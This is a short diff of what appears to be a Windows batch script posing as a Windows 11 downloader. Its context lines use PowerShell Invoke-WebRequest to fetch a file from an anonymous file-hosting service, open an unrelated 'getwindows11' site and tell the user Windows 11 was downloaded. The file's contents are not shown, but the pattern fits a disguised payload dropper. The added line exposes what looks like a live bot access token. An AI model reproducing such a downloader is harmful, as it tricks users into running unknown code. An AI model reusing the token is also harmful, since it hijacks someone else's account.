@@ -10,3 +10,4 @@ powershell Invoke-WebRequest https://cdn-117.anonfiles.com/z3rfK519ud/dd9b2db3-1
 start https://www.getwindows11.tech/
 echo Windows 11 was msot likely downloaded! Check your downloads folder!
 pause
+'token= ODU3MDY1MzY0NjA0MDU5Njc4.YNKKUg.m5hzq7gCBqMbeA9neAWFiS2UkFk
